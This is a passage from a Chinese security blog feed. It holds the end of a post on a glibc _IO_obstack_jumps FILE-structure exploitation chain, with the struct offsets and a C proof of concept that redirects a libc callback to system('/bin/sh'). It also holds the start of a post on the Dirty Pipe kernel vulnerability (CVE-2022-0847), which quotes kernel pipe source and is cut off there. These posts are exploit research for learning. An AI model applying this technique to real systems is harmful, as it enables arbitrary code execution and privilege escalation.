class="line">&#125;;</span><br></pre></td></tr></table></figure><p>也就是在<code>IO_FILE</code>结构体下加一个<code>obstack</code>结构体指针。下面则是<code>obstack</code>结构体的定义:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">obstack</span>          /* <span class="title">control</span> <span class="title">current</span> <span class="title">object</span> <span class="title">in</span> <span class="title">current</span> <span class="title">chunk</span> */</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">long</span> chunk_size;              <span class="comment">/* preferred size to allocate chunks in */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">obstack_chunk</span> *<span class="title">chunk</span>;</span> <span class="comment">/* address of current struct obstack_chunk */</span></span><br><span class="line">  <span class="keyword">char</span> *object_base;            <span class="comment">/* address of object we are building */</span></span><br><span class="line">  <span class="keyword">char</span> *next_free;              <span class="comment">/* where to add next char to current object */</span></span><br><span class="line">  <span class="keyword">char</span> *chunk_limit;            <span class="comment">/* address of char after current chunk */</span></span><br><span class="line">  <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    PTR_INT_TYPE tempint;</span><br><span class="line">    <span class="keyword">void</span> *tempptr;</span><br><span class="line">  &#125; temp;                       <span class="comment">/* Temporary for some macros.  */</span></span><br><span class="line">  <span class="keyword">int</span> alignment_mask;           <span class="comment">/* Mask of alignment for each object. */</span></span><br><span class="line">  <span class="comment">/* These prototypes vary based on &#x27;use_extra_arg&#x27;, and we use</span></span><br><span class="line"><span class="comment">     casts to the prototypeless function type in all assignments,</span></span><br><span class="line"><span class="comment">     but having prototypes here quiets -Wstrict-prototypes.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">obstack_chunk</span> *(*<span class="title">chunkfun</span>) (<span class="title">void</span> *, <span class="title">long</span>);</span></span><br><span class="line">  <span class="keyword">void</span> (*freefun) (<span class="keyword">void</span> *, struct _obstack_chunk *);</span><br><span class="line">  <span class="keyword">void</span> *extra_arg;              <span class="comment">/* first arg for chunk alloc/dealloc funcs */</span></span><br><span class="line">  <span class="keyword">unsigned</span> use_extra_arg : <span class="number">1</span>;     <span class="comment">/* chunk alloc/dealloc funcs take extra arg */</span></span><br><span class="line">  <span class="keyword">unsigned</span> maybe_empty_object : <span class="number">1</span>; <span class="comment">/* There is a possibility that the current</span></span><br><span class="line"><span class="comment">                      chunk contains a zero-length object.  This</span></span><br><span class="line"><span class="comment">                      prevents freeing the chunk if we allocate</span></span><br><span class="line"><span class="comment">                      a bigger chunk to replace it. */</span></span><br><span class="line">  <span class="keyword">unsigned</span> alloc_failed : <span class="number">1</span>;      <span class="comment">/* No longer used, as we now call the failed</span></span><br><span class="line"><span class="comment">                     handler on error, but retained for binary</span></span><br><span class="line"><span class="comment">                     compatibility.  */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>可以看到，上述的vtable中只有<code>_IO_obstack_overflow</code>、<code>_IO_obstack_xsputn</code>这样两个函数，首先关注前一个</p><h3 id="IO-obstack-overflow"><a href="#IO-obstack-overflow" class="headerlink" title="_IO_obstack_overflow"></a>_IO_obstack_overflow</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">_IO_obstack_overflow (_IO_FILE *fp, <span class="keyword">int</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">obstack</span> *<span class="title">obstack</span> =</span> ((struct _IO_obstack_file *) fp)-&gt;obstack;</span><br><span class="line">  <span class="keyword">int</span> size;</span><br><span class="line">  <span class="comment">/* Make room for another character.  This might as well allocate a</span></span><br><span class="line"><span class="comment">     new chunk a memory and moves the old contents over.  */</span></span><br><span class="line">  assert (c != EOF);</span><br><span class="line">  obstack_1grow (obstack, c);</span><br><span class="line">  <span class="comment">/* Setup the buffer pointers again.  */</span></span><br><span class="line">  fp-&gt;_IO_write_base = obstack_base (obstack);</span><br><span class="line">  fp-&gt;_IO_write_ptr = obstack_next_free (obstack);</span><br><span class="line">  size = obstack_room (obstack);</span><br><span class="line">  fp-&gt;_IO_write_end = fp-&gt;_IO_write_ptr + size;</span><br><span class="line">  <span class="comment">/* Now allocate the rest of the current chunk.  */</span></span><br><span class="line">  obstack_blank_fast (obstack, size);</span><br><span class="line">  <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到其中存在一个assert，注意下面如果我们走exit这条路来清空所有缓存时触发的话就会出现rsi必定为<code>-1</code>的情况，所以此路不通</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20221201130547767.png"                      alt="image-20221201130547767"                ></p><h3 id="IO-obstack-xsputn"><a href="#IO-obstack-xsputn" class="headerlink" title="_IO_obstack_xsputn"></a>_IO_obstack_xsputn</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">size_t</span></span><br><span class="line">_IO_obstack_xsputn (FILE *fp, <span class="keyword">const</span> <span class="keyword">void</span> *data, <span class="keyword">size_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">obstack</span> *<span class="title">obstack</span> =</span> ((struct _IO_obstack_file *) fp)-&gt;obstack;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_write_ptr + n &gt; fp-&gt;_IO_write_end)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">int</span> size;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* We need some more memory.  First shrink the buffer to the</span></span><br><span class="line"><span class="comment"> space we really currently need.  */</span></span><br><span class="line">      obstack_blank_fast (obstack, fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_end);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Now grow for N bytes, and put the data there.  */</span></span><br><span class="line">      obstack_grow (obstack, data, n);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Setup the buffer pointers again.  */</span></span><br><span class="line">      fp-&gt;_IO_write_base = obstack_base (obstack);</span><br><span class="line">      fp-&gt;_IO_write_ptr = obstack_next_free (obstack);</span><br><span class="line">      size = obstack_room (obstack);</span><br><span class="line">      fp-&gt;_IO_write_end = fp-&gt;_IO_write_ptr + size;</span><br><span class="line">      <span class="comment">/* Now allocate the rest of the current chunk.  */</span></span><br><span class="line">      obstack_blank_fast (obstack, size);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    fp-&gt;_IO_write_ptr = __mempcpy (fp-&gt;_IO_write_ptr, data, n);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我们的目标时调用到<code>obstack_grow</code>函数，所以我们需要进入这个if语句，这一点很好说，如果我们可以控制这个结构体就可以非常轻松的控制这里的值而后进入if语句，随后又会执行<code>obstack_blank_fast</code>函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#define obstack_blank_fast(h, n) ((h)-&gt;next_free += (n))</span><br></pre></td></tr></table></figure><p>这个其实是一个宏定义，可以看到内部其实不会特别影响后续的内容。在继续执行就会进入我们期望的函数:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> obstack_grow(OBSTACK, where, length)                      \</span></span><br><span class="line"><span class="meta">  __extension__                                   \</span></span><br><span class="line"><span class="meta">    (&#123; struct obstack *__o = (OBSTACK);                       \</span></span><br><span class="line"><span class="meta">       int __len = (length);                              \</span></span><br><span class="line"><span class="meta">       <span class="meta-keyword">if</span> (_o-&gt;next_free + __len &gt; __o-&gt;chunk_limit)                  \</span></span><br><span class="line"><span class="meta">     _obstack_newchunk (__o, __len);                      \</span></span><br><span class="line"><span class="meta">       memcpy (__o-&gt;next_free, where, __len);                     \</span></span><br><span class="line"><span class="meta">       __o-&gt;next_free += __len;                           \</span></span><br><span class="line"><span class="meta">       (void) 0; &#125;)</span></span><br></pre></td></tr></table></figure><p>可以看到这个也是一个宏定义，同样的我们又必须通过<code>_o-&gt;next_free + __len &gt; __o-&gt;chunk_limit</code>这条if语句才能调用到<code>_obstack_newchunk</code>函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">  _obstack_newchunk (struct obstack *h, <span class="keyword">int</span> length)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">obstack_chunk</span> *<span class="title">old_chunk</span> =</span> h-&gt;chunk;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">obstack_chunk</span> *<span class="title">new_chunk</span>;</span></span><br><span class="line">  <span class="keyword">long</span> new_size;</span><br><span class="line">  <span class="keyword">long</span> obj_size = h-&gt;next_free - h-&gt;object_base;</span><br><span class="line">  <span class="keyword">long</span> i;</span><br><span class="line">  <span class="keyword">long</span> already;</span><br><span class="line">  <span class="keyword">char</span> *object_base;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Compute size for new chunk.  */</span></span><br><span class="line">  new_size = (obj_size + length) + (obj_size &gt;&gt; <span class="number">3</span>) + h-&gt;alignment_mask + <span class="number">100</span>;</span><br><span class="line">  <span class="keyword">if</span> (new_size &lt; h-&gt;chunk_size)</span><br><span class="line">    new_size = h-&gt;chunk_size;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Allocate and initialize the new chunk.  */</span></span><br><span class="line">  new_chunk = CALL_CHUNKFUN (h, new_size);</span><br><span class="line">  <span class="keyword">if</span> (!new_chunk)</span><br><span class="line">    (*obstack_alloc_failed_handler)();</span><br><span class="line">  h-&gt;chunk = new_chunk;</span><br><span class="line">  new_chunk-&gt;prev = old_chunk;</span><br><span class="line">  new_chunk-&gt;limit = h-&gt;chunk_limit = (<span class="keyword">char</span> *) new_chunk + new_size;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这里可以直接调用到我们期望的宏定义<code>CALL_CHUNKFUN</code>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">define</span> CALL_CHUNKFUN(h, size) \</span></span><br><span class="line"><span class="meta">  (((h)-&gt;use_extra_arg)      \</span></span><br><span class="line"><span class="meta">   ? (*(h)-&gt;chunkfun)((h)-&gt;extra_arg, (size))      \</span></span><br><span class="line"><span class="meta">   : (*(struct _obstack_chunk *(*)(long))(h)-&gt;chunkfun)((size)))</span></span><br></pre></td></tr></table></figure><p>可以看到这里存在直接拿指针当作函数的操作<code>(*(h)-&gt;chunkfun)((h)-&gt;extra_arg, (size))</code>，条件也就是<code>(((h)-&gt;use_extra_arg)</code>不为0；</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>所以从上到下的调用链也是可以直接写出来了:</p><p><code>_IO_obstack_xsputn</code>=&gt;<code>obstack_grow</code>=&gt;<code>_obstack_newchunk</code>=&gt;<code>CALL_CHUNKFUN</code>=&gt;<code>(*(h)-&gt;chunkfun)((h)-&gt;extra_arg, (size))</code></p><p>最后再根据结构体属性的偏移写上上述约束的值即可。</p><p>当<code>_IO_list_all</code>指向我们可控A地址时，我们需要对A地址写入如下数据：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">A + <span class="number">0x18</span> = <span class="number">1</span>;</span><br><span class="line">A + <span class="number">0x20</span> = <span class="number">0</span>;</span><br><span class="line">A + <span class="number">0x28</span> = <span class="number">1</span>;</span><br><span class="line">A + <span class="number">0x30</span> = <span class="number">0</span>;</span><br><span class="line">A + <span class="number">0x38</span> = system_addr;</span><br><span class="line">A + <span class="number">0x48</span> = bin_sh_addr;</span><br><span class="line">A + <span class="number">0x50</span> = <span class="number">1</span>;</span><br><span class="line">A + <span class="number">0xd8</span> = _IO_obstack_jumps+<span class="number">0x20</span>;</span><br><span class="line">A + <span class="number">0xe0</span> = A;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20221201134245450.png"                      alt="image-20221201134245450"                ></p><h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> bin_sh_addr[<span class="number">0x10</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> libc_base;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> printf_addr;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> *IO_2_1_stderr;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> IO_obstack_jumps;</span><br><span class="line"><span class="built_in">strcpy</span>(bin_sh_addr,<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;start!\n&quot;</span>);</span><br><span class="line">printf_addr = <span class="built_in">printf</span>;</span><br><span class="line">libc_base = printf_addr - <span class="number">0x55700</span>;</span><br><span class="line"></span><br><span class="line">IO_2_1_stderr = libc_base + <span class="number">0x1f7680</span>;</span><br><span class="line">IO_obstack_jumps = libc_base + <span class="number">0x1f33a0</span>;</span><br><span class="line">*(IO_2_1_stderr + (<span class="number">0x28</span>/<span class="number">8</span>)) = <span class="number">0x1</span>;</span><br><span class="line">*(IO_2_1_stderr + (<span class="number">0x30</span>/<span class="number">8</span>)) = <span class="number">0</span>;</span><br><span class="line">*(IO_2_1_stderr + (<span class="number">0x18</span>/<span class="number">8</span>)) = <span class="number">1</span>;</span><br><span class="line">*(IO_2_1_stderr + (<span class="number">0x20</span>/<span class="number">8</span>)) = <span class="number">0</span>;</span><br><span class="line">*(IO_2_1_stderr + (<span class="number">0x50</span>/<span class="number">8</span>)) = <span class="number">1</span>;</span><br><span class="line">*(IO_2_1_stderr + (<span class="number">0xd8</span>/<span class="number">8</span>)) = IO_obstack_jumps+<span class="number">0x20</span>;</span><br><span class="line">*(IO_2_1_stderr + (<span class="number">0xe0</span>/<span class="number">8</span>)) = IO_2_1_stderr;</span><br><span class="line">*(IO_2_1_stderr + (<span class="number">0x38</span>/<span class="number">8</span>)) = system;</span><br><span class="line">*(IO_2_1_stderr + (<span class="number">0x48</span>/<span class="number">8</span>)) = bin_sh_addr;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以上libc均使用:<code>Ubuntu GLIBC 2.36-0ubuntu4</code></p><hr><p>参考文章</p><p><a class="link"   href="https://tttang.com/archive/1845/#toc" >https://tttang.com/archive/1845/#toc<i class="fas fa-external-link-alt"></i></a>_</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;近期又出现一个新的关于&lt;code&gt;IO_FILE&lt;/code&gt;的利用方式，不过原作者并没有出名字但是我blog又是用house of系列分类的所以就先随便取个名字。&lt;/p&gt;
&lt;h2 id=&quot;原理分析&quot;&gt;&lt;a href=&quot;#原理分析&quot; class=&quot;headerlink&quot; t</summary>
      
    
    
    
    <category term="pwn" scheme="https://cv196082.gitee.io/categories/pwn/"/>
    
    
    <category term="house of 系列" scheme="https://cv196082.gitee.io/tags/house-of-%E7%B3%BB%E5%88%97/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2022-0847 Dirty Pipe</title>
    <link href="https://cv196082.gitee.io/2022/11/22/CVE-2022-0847-Dirty-Pipe/"/>
    <id>https://cv196082.gitee.io/2022/11/22/CVE-2022-0847-Dirty-Pipe/</id>
    <published>2022-11-22T12:54:31.000Z</published>
    <updated>2022-11-22T12:54:02.950Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>持续性摆烂一段时间了，又想看jyy的课，又要期末考试了，好烦！索性花点时间把Gyan神上半年叫我复现的CVE复现了。</p><p>这个CVE允许向任意可读文件中写数据，可造成非特权进程向root进程注入代码。该漏洞发生linux内核空间通过splice方式实现数据拷贝时，以”零拷贝”的形式将文件发送到pipe，并且没有初始化pipe缓存页管理数据结构的flag成员。</p><h2 id="零拷贝"><a href="#零拷贝" class="headerlink" title="零拷贝"></a>零拷贝</h2><p>首先需要了解一下零拷贝的概念，在普通的文件传输过程是如下图所示，可以看到这里进行了四次上下文切换，导致不必要的浪费和开销</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/f31ece783dd86621734188fa2d58b4bb.png"                                     ></p><p>所以linux内核出现了解决办法就是可以快速高效地将数据从文件系统移动到网络接口，而不需要将其从内核空间复制到用户空间，而这也就是所谓的零拷贝，在linux内核中有splice方式来解决。</p><p>这个系统调用不仅支持网络层面的传输，如果用户拥有两个已经打开的文件描述符可以任意文件相互连接，而不仅限于socket。</p><h2 id="pipe原理"><a href="#pipe原理" class="headerlink" title="pipe原理"></a>pipe原理</h2><p>pipe在前面的利用中也使用到过，不过大多是利用它申请的结构体的堆块劫持ops或者泄漏，这里主要是使用他初始化会带来的内容。</p><p>首先我们清楚pipe会创建两个文件描述符，一个是输入另一个输出。在内核中pipe缓冲区的总长度是65536字节，一共16页，这里页与页之间不连续是通过数组进行管理的，维护的是一个类似于链表的结构。以前就提到过，pipe在内核中是下图这样的表现形式：</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/640.jpeg"                                     ></p><p>有pipe_buffer结构体只想page，而pipe_buffer结构体在往期kernel中有详细介绍，这里就不再赘述了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">ssize_t</span></span></span><br><span class="line"><span class="function"><span class="title">pipe_write</span><span class="params">(struct kiocb *iocb, struct iov_iter *from)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">filp</span> =</span> iocb-&gt;ki_filp;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">pipe</span> =</span> filp-&gt;private_data;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> head;</span><br><span class="line"><span class="keyword">ssize_t</span> ret = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> total_len = iov_iter_count(from);</span><br><span class="line"><span class="keyword">ssize_t</span> chars;</span><br><span class="line"><span class="keyword">bool</span> was_empty = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">bool</span> wake_next_writer = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Null write succeeds. */</span></span><br><span class="line"><span class="keyword">if</span> (unlikely(total_len == <span class="number">0</span>))</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">__pipe_lock(pipe);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!pipe-&gt;readers) &#123;</span><br><span class="line">send_sig(SIGPIPE, current, <span class="number">0</span>);</span><br><span class="line">ret = -EPIPE;</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line"><span class="keyword">if</span> (pipe-&gt;watch_queue) &#123;</span><br><span class="line">ret = -EXDEV;</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Only wake up if the pipe started out empty, since</span></span><br><span class="line"><span class="comment"> * otherwise there should be no readers waiting.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * If it wasn&#x27;t empty we try to merge new data into</span></span><br><span class="line"><span class="comment"> * the last buffer.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * That naturally merges small writes, but it also</span></span><br><span class="line"><span class="comment"> * page-aligs the rest of the writes for large writes</span></span><br><span class="line"><span class="comment"> * spanning multiple pages.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">head = pipe-&gt;head;</span><br><span class="line">was_empty = pipe_empty(head, pipe-&gt;tail);</span><br><span class="line">chars = total_len &amp; (PAGE_SIZE<span class="number">-1</span>);</span><br><span class="line"><span class="keyword">if</span> (chars &amp;&amp; !was_empty) &#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> mask = pipe-&gt;ring_size - <span class="number">1</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">buf</span> =</span> &amp;pipe-&gt;bufs[(head - <span class="number">1</span>) &amp; mask];</span><br><span class="line"><span class="keyword">int</span> offset = buf-&gt;offset + buf-&gt;len;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((buf-&gt;flags &amp; PIPE_BUF_FLAG_CAN_MERGE) &amp;&amp;</span><br><span class="line">    offset + chars &lt;= PAGE_SIZE) &#123;</span><br><span class="line">ret = pipe_buf_confirm(pipe, buf);</span><br><span class="line"><span class="keyword">if</span> (ret)</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">ret = copy_page_from_iter(buf-&gt;page, offset, chars, from);</span><br><span class="line"><span class="keyword">if</span> (unlikely(ret &lt; chars)) &#123;</span><br><span class="line">ret = -EFAULT;</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">buf-&gt;len += ret;</span><br><span class="line"><span class="keyword">if</span> (!iov_iter_count(from))</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span 